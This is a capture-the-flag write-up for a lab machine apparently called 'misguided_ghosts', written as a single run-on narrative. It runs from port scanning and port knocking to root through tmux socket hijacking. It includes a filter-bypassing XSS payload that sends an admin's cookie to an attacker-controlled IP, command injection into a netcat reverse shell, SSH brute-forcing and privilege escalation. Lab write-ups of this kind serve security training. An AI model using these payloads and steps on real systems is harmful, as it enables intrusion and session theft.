Started with a nmap scan 
```
21 vsftpd 3.0.3
22 OpenSSH 7.6p1
8080 Werkzueg 1.0.1 Python 2.7.18
```
There is a ftp running with anonymous login with 3 files
```
info.txt
jokes.txt
trace.pcapng
```
In the jokes file we get 2 possible usernames `Josh,Taylor,Paramore` and a email address `zac@misguided_ghosts.thm` looking at the pcap file took me a little bit to find this out but we need to port knock to find the ports needed we sort the pcap file by `192.168.236.131` `7864,8273,9241,12007,60753`  now that we have port `8080` open we get a webserver with a domain `misguided_ghosts.thm` this domain will work even though its against the RFC  going to run a gobuster scan now 
```
/console
/dashboard
/login
/photos
```
So now we only have a login page we can work with so trying possible usernames we have I found that the login is `zac:zac` now that were logged in it says we can make a post and the admin will view it in a couple of minutes after a lot of testing for xss payloads I found HTML entity encoding bypassed it 
```
&lt;sscriptcript&gt;var i = new Image(); i.src = "http://10.13.8.255:8000/" + document.cookie;&lt;/sscriptcript&gt;
```
and we get the cookie back after a few minutes `hayley_is_admin` now when we go to the file upload we can upload a file and its looking for a image and when we try to upload a file says we cant access the file so at first I tried LFI and the error stopped but still reflecting what I typed so I did command injection and it worked `;ls` and it list all the files in that folder we had to use nc with `{IFS}` in the spaces and put the `-e` after the port now we have access to the server as root if we go to the home folder there is one user called `zac` and there is a folder called `notes` and it has two files called `.id_rsa,.secret` but the secret file says its been encrypted with a cipher and a key we can do this manually or there are some scripts online that will work what were doing is called a plaintext attack now that I go the key `.........` we can go online and decode the `id_rsa` and get the real one and now we can SSH into the user `zac` and have a real shell now I ran linpeas and it shows that smb ports are open locally so we need to port forward the port and see what's on it `ssh -L 445:localhost:445 zac@10.10.110.15 -i id_rsa` and it has guest access and there is a share called `local` there is a file called `passwords.bak` maybe we can brute the ssh password for `hayley` and got the password `....!` we can run `visudo` as root but when I run it I get connection closed when running linpeas we seen root had a tmux session going with group permissions of `hayley` so went to the `/opt` folder and ran `tmux -S .details` and now we are root 